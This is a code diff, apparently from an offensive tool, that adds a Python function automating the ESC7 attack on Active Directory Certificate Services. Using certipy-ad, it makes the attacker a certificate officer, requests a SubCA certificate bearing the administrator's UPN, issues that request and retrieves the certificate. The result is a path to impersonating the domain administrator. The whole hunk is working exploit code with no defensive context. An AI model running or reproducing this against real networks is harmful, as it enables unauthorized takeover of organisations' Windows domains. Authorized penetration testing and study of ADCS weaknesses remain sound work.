@@ -97,3 +97,55 @@ def exploit_esc4(domain, dc_ip, username, password, ca_name, template_name):
         "-domain", domain
     ], check=True)
 
+# ESC7
+def exploit_esc7(domain, dc_ip, username, password, ca_name):
+    print("[*] Exploiting ESC7 vulnerability...")
+
+    user = f"{username}@{domain}"
+
+    try:
+        # Step 1: Add the user as a certificate manager (officer)
+        subprocess.run([
+            "certipy-ad", "ca",
+            "-ca", ca_name,
+            "-add-officer", username,
+            "-username", user,
+            "-p", password
+        ], check=True)
+        print("[+] Added user as Certificate Manager.")
+
+        # Step 2: Request SubCA certificate
+        subprocess.run([
+            "certipy-ad", "req",
+            "-ca", ca_name,
+            "-target", domain,
+            "-template", "SubCA",
+            "-upn", f"administrator@{domain}",
+            "-username", user,
+            "-p", password
+        ], check=True)
+        print("[+] Requested SubCA certificate.")
+
+        # Step 3: Issue the request
+        subprocess.run([
+            "certipy-ad", "ca",
+            "-ca", ca_name,
+            "-issue-request", "25",  # Placeholder: adjust if needed
+            "-username", user,
+            "-p", password
+        ], check=True)
+        print("[+] Issued request.")
+
+        # Step 4: Retrieve the certificate
+        subprocess.run([
+            "certipy-ad", "req",
+            "-ca", ca_name,
+            "-target", domain,
+            "-retrieve", "25",  # Placeholder: adjust if needed
+            "-username", user,
+            "-p", password
+        ], check=True)
+        print("[+] Retrieved issued certificate.")
+
+    except subprocess.CalledProcessError as e:
+        print(f"[!] ESC7 exploitation failed: {e}")
